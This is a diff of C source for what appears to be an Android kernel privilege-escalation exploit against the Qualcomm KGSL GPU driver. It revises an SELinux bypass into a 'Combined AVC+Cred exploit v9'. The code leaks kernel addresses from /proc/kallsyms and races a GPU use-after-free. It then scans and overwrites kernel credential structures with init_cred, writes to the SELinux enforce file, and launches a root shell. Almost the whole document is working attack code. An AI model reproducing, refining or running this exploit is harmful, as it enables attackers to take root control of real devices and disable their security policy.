@@ -96,7 +96,32 @@ static long perf_open(struct perf_event_attr *attr, pid_t pid, int cpu, int grou
     return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
 }
 
+static uint64_t read_kallsyms_symbol(const char *name) {
+    FILE *fp = fopen("/proc/kallsyms", "r");
+    if (!fp) return 0;
+    char line[256];
+    uint64_t addr = 0;
+    while (fgets(line, sizeof(line), fp)) {
+        char sym[64];
+        char type;
+        unsigned long long a;
+        if (sscanf(line, "%llx %c %63s", &a, &type, sym) == 3) {
+            if (strcmp(sym, name) == 0) {
+                addr = (uint64_t)a;
+                break;
+            }
+        }
+    }
+    fclose(fp);
+    return addr;
+}
+
 uint64_t get_kaslr_offset(void) {
+    uint64_t stext = read_kallsyms_symbol("_stext");
+    if (stext) {
+        int64_t kaslr = (int64_t)(stext - VMLINUX_TEXT);
+        return (uint64_t)kaslr;
+    }
     struct perf_event_attr pe = {0};
     pe.type = PERF_TYPE_HARDWARE;
     pe.size = sizeof(pe);
@@ -140,7 +165,6 @@ uint64_t get_kaslr_offset(void) {
     munmap(buf, mmap_size);
     close(fd);
     if (!first_ip) return 0;
-
     int64_t kaslr = (int64_t)(first_ip - VMLINUX_TEXT);
     kaslr &= ~0x1FFFFFLL;
     return (uint64_t)kaslr;
@@ -212,18 +236,21 @@ int main(int argc, char **argv) {
     (void)argc;
     (void)argv;
     setbuf(stdout, NULL);
-    printf("[+] AVC bypass v7 (with SELinux state patching)\n");
+    printf("[+] Combined AVC+Cred exploit v9\n");
 
     uint64_t kaslr = get_kaslr_offset();
     if (!kaslr) {
-        printf("[-] KASLR detection failed, using fallback\n");
-        kaslr = 0x1a400000;
+        printf("[-] KASLR detection failed\n");
+        return 1;
     }
     int64_t kaslr_signed = (int64_t)kaslr;
-    uint64_t selinux_state_addr = VMLINUX_SELINUX_STATE + kaslr_signed;
-    uint64_t enforcing_boot_addr = VMLINUX_SELINUX_ENFORCING_BOOT + kaslr_signed;
-    printf("[*] KASLR offset: %ld (0x%lx), selinux_state: 0x%lx, enforcing_boot: 0x%lx\n",
-           kaslr_signed, (unsigned long)kaslr, (unsigned long)selinux_state_addr, (unsigned long)enforcing_boot_addr);
+    uint64_t init_cred_addr = (uint64_t)((int64_t)VMLINUX_INIT_CRED + kaslr_signed);
+    uint64_t selinux_state_addr = (uint64_t)((int64_t)VMLINUX_SELINUX_STATE + kaslr_signed);
+    uint64_t enforcing_boot_addr = (uint64_t)((int64_t)VMLINUX_SELINUX_ENFORCING_BOOT + kaslr_signed);
+    printf("[*] KASLR: %ld (0x%lx)\n", kaslr_signed, (unsigned long)kaslr);
+    printf("[*] init_cred: 0x%lx\n", (unsigned long)init_cred_addr);
+    printf("[*] selinux_state: 0x%lx\n", (unsigned long)selinux_state_addr);
+    printf("[*] enforcing_boot: 0x%lx\n", (unsigned long)enforcing_boot_addr);
 
     int start_pipe[2], done_pipe[2], setenforce_pipe[2];
     pipe(start_pipe); pipe(done_pipe); pipe(setenforce_pipe);
@@ -234,30 +261,46 @@ int main(int argc, char **argv) {
     fcntl(setenforce_pipe[0], F_SETFD, FD_CLOEXEC);
     fcntl(setenforce_pipe[1], F_SETFD, FD_CLOEXEC);
 
-    for (int i = 0; i < N_AVC_CHILD; i++) {
+    int notify_pipe[2];
+    pipe(notify_pipe);
+    fcntl(notify_pipe[0], F_SETFD, FD_CLOEXEC);
+    fcntl(notify_pipe[1], F_SETFD, FD_CLOEXEC);
+
+    printf("[*] Phase 1: Spawning children for spray\n");
+    pid_t spray_pids[SPRAY_PIDS];
+    int n_spray = 0;
+    for (int i = 0; i < SPRAY_PIDS; i++) {
         pid_t p = fork();
         if (p == 0) {
             close(start_pipe[1]);
             close(done_pipe[0]);
             close(setenforce_pipe[1]);
-            prctl(PR_SET_NAME, "AVCCHILD");
+            close(notify_pipe[0]);
+            prctl(PR_SET_NAME, "TASKUAF!!");
             char sig;
             if (read(start_pipe[0], &sig, 1) != 1) _exit(0);
             close(start_pipe[0]);
             gen_avc_entries_enhanced();
             write(done_pipe[1], "G", 1);
-            if (read(setenforce_pipe[0], &sig, 1) != 1) _exit(0);
-            close(setenforce_pipe[0]);
-            int fd = open("/sys/fs/selinux/enforce", O_WRONLY);
-            if (fd >= 0) {
-                write(fd, "0", 1);
-                close(fd);
+            for (int j = 0; j < 1800; j++) {
+                usleep(200000);
+                if (getuid() == 0) {
+                    usleep(50000);
+                    pid_t me = getpid();
+                    write(notify_pipe[1], &me, sizeof(me));
+                    execl("/system/bin/sh", "sh", NULL);
+                    _exit(0);
+                }
             }
+            close(notify_pipe[1]);
             _exit(0);
         }
+        if (p > 0) spray_pids[n_spray++] = p;
+        else break;
     }
     close(start_pipe[0]);
     close(done_pipe[1]);
+    close(notify_pipe[0]);
 
     printf("[*] Phase 2: UAF setup\n");
     kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
@@ -299,7 +342,7 @@ int main(int argc, char **argv) {
     }
     printf("[+] Race won\n");
 
-    printf("[*] Phase 4: Free UAF\n");
+    printf("[*] Phase 4: Free UAF and reclaim\n");
     gpuobj_free(kgsl_fd, uaf_id);
     int rf = open("/proc/sys/vm/compact_memory", O_WRONLY);
     if (rf >= 0) { write(rf, "1", 1); close(rf); }
@@ -307,19 +350,19 @@ int main(int argc, char **argv) {
     if (rf >= 0) { write(rf, "3", 1); close(rf); }
     usleep(50000);
 
-    printf("[*] Phase 5: Start AVC children\n");
-    for (int i = 0; i < N_AVC_CHILD; i++) write(start_pipe[1], "G", 1);
+    printf("[*] Phase 5: Start children for AVC generation\n");
+    for (int i = 0; i < n_spray; i++) write(start_pipe[1], "G", 1);
     close(start_pipe[1]);
 
-    printf("[*] Phase 5b: Wait for AVC generation...\n");
-    for (int i = 0; i < N_AVC_CHILD; i++) {
+    printf("[*] Phase 5b: Wait for children to generate AVC\n");
+    for (int i = 0; i < n_spray; i++) {
         char c;
         read(done_pipe[0], &c, 1);
     }
     close(done_pipe[0]);
     printf("  All children done generating\n");
 
-    printf("[*] Phase 6: GPU scan for AVC pages\n");
+    printf("[*] Phase 6: GPU scan for AVC and cred pages\n");
     fflush(stdout);
     unsigned int ctx = create_context(kgsl_fd);
     int ib_id = gpuobj_alloc(kgsl_fd, 0x10000, fl);
@@ -335,7 +378,11 @@ int main(int argc, char **argv) {
 
     uint64_t avc_vas[256];
     int n_avc = 0;
-    for (uint64_t va = scan_start; va < scan_end && n_avc < 256; va += 0x1000) {
+    uint64_t cred_pages[32];
+    int cred_offs[32];
+    int n_cred = 0;
+
+    for (uint64_t va = scan_start; va < scan_end && (n_avc < 256 || n_cred < 1); va += 0x1000) {
         if (((va - scan_start) & 0xFFFFF) == 0) printf(".");
         memset(ib_m, 0, 0x10000);
         memset(dst_m, 0, 0x1000);
@@ -358,6 +405,7 @@ int main(int argc, char **argv) {
         if (wait_timestamp(kgsl_fd, ctx, ts) < 0) break;
         __sync_synchronize();
         uint32_t *d = (uint32_t *)dst_m;
+
         int ahits = 0;
         for (int ofs = 0; ofs < 4032; ofs += 72) {
             int idx = ofs / 4;
@@ -374,10 +422,24 @@ int main(int argc, char **argv) {
             avc_vas[n_avc] = va;
             n_avc++;
         }
-    }
-    printf("\n  Found %d AVC pages\n", n_avc);
 
-    printf("[*] Phase 7: GPU overwrite AVC allowed fields and SELinux state\n");
+        int cred_off = -1;
+        for (int i = 0; i < SCAN_DWORDS - 8; i++) {
+            int cnt = 0;
+            for (int j = 0; j < 8; j++)
+                if (d[i + j] == 0x000007D0) cnt++;
+            if (cnt >= 4) { cred_off = i * 4; break; }
+        }
+        if (cred_off >= 0 && n_cred < 32) {
+            printf("  [CRED] va=0x%lx off=0x%x\n", (unsigned long)va, cred_off);
+            cred_pages[n_cred] = va;
+            cred_offs[n_cred] = cred_off;
+            n_cred++;
+        }
+    }
+    printf("\n  Found %d AVC pages, %d cred pages\n", n_avc, n_cred);
+
+    printf("[*] Phase 7: GPU overwrite AVC allowed fields\n");
     for (int p = 0; p < n_avc; p++) {
         memset(ib_m, 0, 0x10000);
         uint32_t *cmd = (uint32_t *)ib_m;
@@ -398,129 +460,69 @@ int main(int argc, char **argv) {
         if (submit_ib(kgsl_fd, ctx, ib_ga, dw*4, ib_id, &ts) == 0)
             wait_timestamp(kgsl_fd, ctx, ts);
     }
+    flush_cpu_cache((void*)UAF_ADDR, UAF_SIZE);
 
-    printf("[*] Phase 7b: Direct SELinux state patching (enforcing=0)\n");
-    {
-        uint32_t *cmd = (uint32_t *)ib_m;
-        int dw = 0;
-        memset(ib_m, 0, 0x10000);
-        cmd[dw++] = cp_type7(CP_NOP, 0);
-        uint64_t candidates[] = {
-            selinux_state_addr + 0x0,
-            selinux_state_addr + 0x1,
-            selinux_state_addr + 0x2,
-            selinux_state_addr + 0x3,
-            selinux_state_addr + 0x4,
-            selinux_state_addr + 0x5,
-            selinux_state_addr + 0x6,
-            selinux_state_addr + 0x7,
-            selinux_state_addr + 0x8,
-            selinux_state_addr + 0x9,
-            selinux_state_addr + 0xa,
-            selinux_state_addr + 0xb,
-            selinux_state_addr + 0xc,
-            selinux_state_addr + 0x10,
-            selinux_state_addr + 0x14,
-            selinux_state_addr + 0x18,
-            selinux_state_addr + 0x1c,
-            selinux_state_addr + 0x20,
-            enforcing_boot_addr,
-            enforcing_boot_addr + 0x1,
-            enforcing_boot_addr + 0x2,
-            enforcing_boot_addr + 0x3,
-            enforcing_boot_addr + 0x4
-        };
-        for (int i = 0; i < sizeof(candidates)/sizeof(uint64_t); i++) {
-            uint32_t al, ah;
-            split64(candidates[i], &al, &ah);
-            cmd[dw++] = cp_type7(CP_MEM_WRITE, 3);
-            cmd[dw++] = al;
-            cmd[dw++] = ah;
-            cmd[dw++] = 0;
+    printf("[*] Phase 8: Overwrite cred pages with init_cred\n");
+    if (n_cred > 0) {
+        for (int p = 0; p < n_cred && p < 32; p++) {
+            uint64_t cbase = cred_pages[p] + cred_offs[p];
+            uint32_t *cmd = (uint32_t *)ib_m;
+            int dw = 0;
+            memset(ib_m, 0, 0x10000);
+            memset(dst_m, 0, 0x1000);
+
+            cmd[dw++] = cp_type7(CP_NOP, 0);
+            for (int i = 0; i < CRED_COPY_SIZE/4; i++) {
+                uint32_t dl, dh, sl, sh;
+                split64(dst_ga + i*4, &dl, &dh);
+                split64(init_cred_addr + i*4, &sl, &sh);
+                cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
+                cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
+                cmd[dw++] = sl; cmd[dw++] = sh;
+            }
+            for (int i = 0; i < CRED_COPY_SIZE/4; i++) {
+                uint32_t dl, dh, sl, sh;
+                split64(cbase + i*4, &dl, &dh);
+                split64(dst_ga + i*4, &sl, &sh);
+                cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
+                cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
+                cmd[dw++] = sl; cmd[dw++] = sh;
+            }
+            cmd[dw++] = cp_type7(CP_NOP, 0);
+            __sync_synchronize();
+            unsigned int ts;
+            if (submit_ib(kgsl_fd, ctx, ib_ga, dw*4, ib_id, &ts) == 0)
+                wait_timestamp(kgsl_fd, ctx, ts);
         }
-        cmd[dw++] = cp_type7(CP_NOP, 0);
-        __sync_synchronize();
-        unsigned int ts;
-        if (submit_ib(kgsl_fd, ctx, ib_ga, dw*4, ib_id, &ts) == 0)
-            wait_timestamp(kgsl_fd, ctx, ts);
         flush_cpu_cache((void*)UAF_ADDR, UAF_SIZE);
+        printf("  Cred overwrite done\n");
     }
 
-    printf("[*] Phase 7c: Additional direct write to selinux_state + 0x0 as u64\n");
-    {
-        uint32_t *cmd = (uint32_t *)ib_m;
-        int dw = 0;
-        memset(ib_m, 0, 0x10000);
-        cmd[dw++] = cp_type7(CP_NOP, 0);
-        uint64_t addr = selinux_state_addr;
-        uint32_t al, ah;
-        split64(addr, &al, &ah);
-        cmd[dw++] = cp_type7(CP_MEM_WRITE, 5);
-        cmd[dw++] = al;
-        cmd[dw++] = ah;
-        cmd[dw++] = 0;
-        cmd[dw++] = 0;
-        cmd[dw++] = 0;
-        cmd[dw++] = cp_type7(CP_NOP, 0);
-        __sync_synchronize();
-        unsigned int ts;
-        if (submit_ib(kgsl_fd, ctx, ib_ga, dw*4, ib_id, &ts) == 0)
-            wait_timestamp(kgsl_fd, ctx, ts);
-        flush_cpu_cache((void*)UAF_ADDR, UAF_SIZE);
-    }
-
-    printf("[*] Phase 8: Signal all children to setenforce 0\n");
-    for (int i = 0; i < N_AVC_CHILD; i++) write(setenforce_pipe[1], "S", 1);
+    printf("[*] Phase 9: Signal children to try setenforce 0\n");
+    for (int i = 0; i < n_spray; i++) write(setenforce_pipe[1], "S", 1);
     close(setenforce_pipe[1]);
 
-    printf("[*] Phase 9: Verify SELinux status\n");
-    usleep(500000);
-    int success = 0;
-    for (int attempt = 0; attempt < 20 && !success; attempt++) {
-        int enf = open("/sys/fs/selinux/enforce", O_RDONLY);
-        if (enf >= 0) {
-            char ec;
-            int n = read(enf, &ec, 1);
-            close(enf);
-            if (n == 1 && ec == '0') {
-                success = 1;
-                break;
-            }
-        }
-        int fd = open("/sys/fs/selinux/enforce", O_WRONLY);
-        if (fd >= 0) {
-            if (write(fd, "0", 1) == 1) success = 1;
-            close(fd);
-        }
-        if (!success) {
-            usleep(100000);
-            for (int i = 0; i < 5000; i++) {
-                int f = open("/proc/self/status", O_RDONLY);
-                if (f >= 0) {
-                    char b[256];
-                    read(f, b, 256);
-                    close(f);
-                }
-            }
-        }
+    printf("[*] Phase 10: Wait for root shell\n");
+    struct pollfd pfd = { .fd = notify_pipe[0], .events = POLLIN };
+    pid_t winner = 0;
+    if (poll(&pfd, 1, 15000) > 0 &&
+        read(notify_pipe[0], &winner, sizeof(winner)) == sizeof(winner)) {
+        printf("[+] ROOT! uid=0 at PID %d\n", winner);
+        for (int i = 0; i < n_spray; i++)
+            if (spray_pids[i] != winner) kill(spray_pids[i], SIGKILL);
+        while (waitpid(-1, NULL, WNOHANG) > 0);
+        printf("\n  # ROOT SHELL (uid=0) - type exit to quit\n  # ");
+        fflush(stdout);
+        waitpid(winner, NULL, 0);
+        printf("[-] Root shell exited\n");
+    } else {
+        printf("[-] No child got uid=0\n");
     }
 
-    if (success) printf("[+] SUCCESS! SELinux permissive!\n");
-    else printf("[-] Failed (%d AVC pages found)\n", n_avc);
-
-    int enf = open("/sys/fs/selinux/enforce", O_RDONLY);
-    if (enf >= 0) {
-        char ec;
-        int n = read(enf, &ec, 1);
-        close(enf);
-        if (n == 1) printf("  SELinux enforce=%c (%s)\n", ec, ec == '0' ? "permissive" : "enforcing");
-    }
-
-    close(start_pipe[0]);
-    close(done_pipe[0]);
+    close(notify_pipe[0]);
     close(setenforce_pipe[0]);
-    for (int i = 0; i < N_AVC_CHILD; i++) kill(0, SIGKILL);
-    while (waitpid(-1, NULL, WNOHANG) > 0);
+    for (int i = 0; i < n_spray; i++) kill(spray_pids[i], SIGKILL);
+    while (wait(NULL) > 0);
     printf("[*] Done.\n");
-    return success ? 0 : 1;
+    return 0;
 }
